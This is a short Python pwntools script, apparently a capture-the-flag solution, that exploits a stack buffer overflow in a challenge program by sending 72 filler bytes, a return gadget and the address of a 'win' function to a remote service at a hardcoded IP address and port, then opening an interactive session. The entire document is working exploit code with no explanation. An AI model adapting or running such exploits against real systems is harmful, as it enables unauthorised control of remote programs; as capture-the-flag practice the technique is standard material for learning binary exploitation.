from pwn import *

#p = process('./pwn_chal')
p = remote('14.139.34.11', 8082)

ret = 0x401281
win = 0x4011d6

payload = b'A'*72
payload += p64(ret)
payload += p64(win)

p.sendline(payload)

p.interactive()
